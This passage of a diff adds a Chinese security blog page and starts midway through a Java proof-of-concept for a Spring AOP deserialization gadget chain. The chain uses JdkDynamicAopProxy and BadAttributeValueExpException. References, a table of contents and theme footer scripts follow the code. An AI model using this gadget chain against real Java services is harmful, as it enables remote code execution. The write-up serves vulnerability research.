</span><br><span class="line">        <span class="type">Advisor</span> <span class="variable">advisor</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DefaultIntroductionAdvisor</span>((Advice) advice);  </span><br><span class="line">        array.add(advisor);  </span><br><span class="line">  </span><br><span class="line">        setFieldValue(advisedSupport,<span class="string">&quot;advisors&quot;</span>,array);  </span><br><span class="line">        setFieldValue(advisedSupport,<span class="string">&quot;advisorChainFactory&quot;</span>,<span class="keyword">new</span> <span class="title class_">DefaultAdvisorChainFactory</span>());  </span><br><span class="line">        <span class="type">Object</span> <span class="variable">proxy</span> <span class="operator">=</span> java.lang.reflect.Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(),<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;java.util.Map.class&#125;,getProxy(advisedSupport));  </span><br><span class="line">        <span class="type">BadAttributeValueExpException</span> <span class="variable">badAttributeValueExpException</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BadAttributeValueExpException</span>(<span class="literal">null</span>);  </span><br><span class="line">        setFieldValue(badAttributeValueExpException,<span class="string">&quot;val&quot;</span>,proxy);  </span><br><span class="line">        Util.deserialize(Util.serialize(badAttributeValueExpException));  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception &#123;  </span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fieldName);  </span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">        field.set(obj, value);  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> InvocationHandler <span class="title function_">getProxy</span><span class="params">(AdvisedSupport obj)</span> <span class="keyword">throws</span> ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException, IllegalAccessException &#123;  </span><br><span class="line">        <span class="type">Class</span> <span class="variable">jdkproxy</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;org.springframework.aop.framework.JdkDynamicAopProxy&quot;</span>);  </span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> jdkproxy.getDeclaredConstructor(AdvisedSupport.class);  </span><br><span class="line">        constructor.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">jdkinvoke</span> <span class="operator">=</span> (InvocationHandler) constructor.newInstance(obj);  </span><br><span class="line">        <span class="keyword">return</span> jdkinvoke;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+
+<p><strong>参考文章：</strong><br><a href="https://gsbp0.github.io/post/springaop/">https://gsbp0.github.io/post/springaop/</a><br><a href="https://mp.weixin.qq.com/s/oQ1mFohc332v8U1yA7RaMQ">https://mp.weixin.qq.com/s/oQ1mFohc332v8U1yA7RaMQ</a></p>
+
+                <hr>
+                
+
+                <ul class="pager">
+                    
+                    
+                    <li class="next">
+                        <a href="/2025/03/25/FristBlog/" data-toggle="tooltip" data-placement="top"
+                           title="FirstBlog">Next Post &rarr;</a>
+                    </li>
+                    
+                </ul>
+
+                
+
+                
+
+
+                <!--加入新的评论系统-->
+                
+                <!-- 来必力City版安装代码 -->
+                <div id="lv-container" data-id="city" data-uid="MTAyMC82MDUwNS8zNjk3NA==">
+                    <script type="text/javascript">
+                        (function(d, s) {
+                            var j, e = d.getElementsByTagName(s)[0];
+
+                            if (typeof LivereTower === 'function') { return; }
+
+                            j = d.createElement(s);
+                            j.src = 'https://cdn-city.livere.com/js/embed.dist.js';
+                            j.async = true;
+
+                            e.parentNode.insertBefore(j, e);
+                        })(document, 'script');
+                    </script>
+                    <noscript> 为正常使用来必力评论功能请激活JavaScript</noscript>
+                </div>
+                <!-- City版安装代码已完成 -->
+                
+
+                
+
+            </div>
+
+            <div class="hidden-xs col-sm-3 toc-col">
+                <div class="toc-wrap">
+                    <ol class="toc"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%89%8D%E6%8F%90%E6%9D%A1%E4%BB%B6"><span class="toc-text">前提条件</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%93%BE%E5%AD%90%E5%88%86%E6%9E%90"><span class="toc-text">链子分析</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#POC"><span class="toc-text">POC</span></a></li></ol>
+                </div>
+            </div>
+        </div>
+
+        <div class="row">
+            <!-- Sidebar Container -->
+
+            <div class="
+                col-lg-8 col-lg-offset-2
+                col-md-10 col-md-offset-1
+                sidebar-container">
+
+                <!-- Featured Tags -->
+                
+                <section>
+                    <!-- no hr -->
+                    <h5 class="text-center">
+                        <a href="/tags/">FEATURED TAGS</a>
+                    </h5>
+                    <div class="tags">
+                        
+                        <a class="tag" href="/tags/#java"
+                           title="java">java</a>
+                        
+                        <a class="tag" href="/tags/#web"
+                           title="web">web</a>
+                        
+                    </div>
+                </section>
+                
+
+                <!-- Friends Blog -->
+                
+            </div>
+        </div>
+
+    </div>
+</article>
+
+
+
+
+
+
+
+<!-- Footer -->
+<!-- Footer -->
+<footer>
+    <div class="container">
+        <div class="row">
+            <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1 text-center">
+                <br>
+                <ul class="list-inline text-center">
+                
+                
+                    <li>
+                        <a target="_blank" href="https://twitter.com/lhRaMk7">
+                            <span class="fa-stack fa-lg">
+                                <i class="fa fa-circle fa-stack-2x"></i>
+                                <i class="fa fa-twitter fa-stack-1x fa-inverse"></i>
+                            </span>
+                        </a>
+                    </li>
+                
+                
+
+                
+                    <li>
+                        <a target="_blank" href="http://weibo.com/lhRaMk7">
+                            <span class="fa-stack fa-lg">
+                                <i class="fa fa-circle fa-stack-2x"></i>
+                                <i class="fa fa-weibo fa-stack-1x fa-inverse"></i>
+                            </span>
+                        </a>
+                    </li>
+                
+
+                
+
+                
+                    <li>
+                        <a target="_blank"  href="https://github.com/lhRaMk7">
+                            <span class="fa-stack fa-lg">
+                                <i class="fa fa-circle fa-stack-2x"></i>
+                                <i class="fa fa-github fa-stack-1x fa-inverse"></i>
+                            </span>
+                        </a>
+                    </li>
+                
+
+                
+
+                </ul>
+                <p class="copyright text-muted">
+                    Copyright &copy; lhRaMk7 2025
+                    <br>
+                    <span id="busuanzi_container_site_pv" style="font-size: 12px;">PV: <span id="busuanzi_value_site_pv"></span> Times</span>
+                    <br>
+                    Theme by <a href="https://haojen.github.io/">Haojen Ma</a>
+                </p>
+
+            </div>
+        </div>
+    </div>
+</footer>
+
+<!-- jQuery -->
+
+<script src="/js/jquery.min.js"></script>
+
+
+<!-- Bootstrap Core JavaScript -->
+
+<script src="/js/bootstrap.min.js"></script>
+
+
+<!-- Custom Theme JavaScript -->
+
+<script src="/js/blog.js"></script>
+
+
+<!-- async load function -->
+<script>
+    function async(u, c) {
+      var d = document, t = 'script',
+          o = d.createElement(t),
+          s = d.getElementsByTagName(t)[0];
+      o.src = u;
+      if (c) { o.addEventListener('load', function (e) { c(null, e); }, false); }
+      s.parentNode.insertBefore(o, s);
+    }
+</script>
+
+<!-- jquery.tagcloud.js -->
+<script>
+    // only load tagcloud.js in tag.html
+    if($('#tag_cloud').length !== 0){
+        async("http://lhRaMk7.github.io/js/jquery.tagcloud.js",function(){
+            $.fn.tagcloud.defaults = {
+                //size: {start: 1, end: 1, unit: 'em'},
+                color: {start: '#bbbbee', end: '#0085a1'},
+            };
+            $('#tag_cloud a').tagcloud();
+        })
+    }
+</script>
+
+<!--fastClick.js -->
+<script>
+    async("//cdn.bootcss.com/fastclick/1.0.6/fastclick.min.js", function(){
+        var $nav = document.querySelector("nav");
+        if($nav) FastClick.attach($nav);
+    })
+</script>
+
+
+
+<!-- Google Analytics -->
+
+
+
+<!-- Baidu Tongji -->
+
+
+<!-- swiftype -->
+<script type="text/javascript">
+  (function(w,d,t,u,n,s,e){w['SwiftypeObject']=n;w[n]=w[n]||function(){
+  (w[n].q=w[n].q||[]).push(arguments);};s=d.createElement(t);
+  e=d.getElementsByTagName(t)[0];s.async=1;s.src=u;e.parentNode.insertBefore(s,e);
+  })(window,document,'script','//s.swiftypecdn.com/install/v2/st.js','_st');
+
+  _st('install','','2.0.0');
+</script>
+
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+<span id="busuanzi_container_site_pv" style="font-size: 12px;display:none;">总访问量：<span id="busuanzi_value_site_pv"></span>次</span>
+<span class="post-meta-divider">|</span>
+<span id="busuanzi_container_site_uv" style="font-size: 12px;display:none;">总访客：<span id="busuanzi_value_site_uv"></span>人</span>
+
+
+<!--wechat title img-->
+<img class="wechat-title-img" src="/img/head.png">
+</body>
+
+</html>
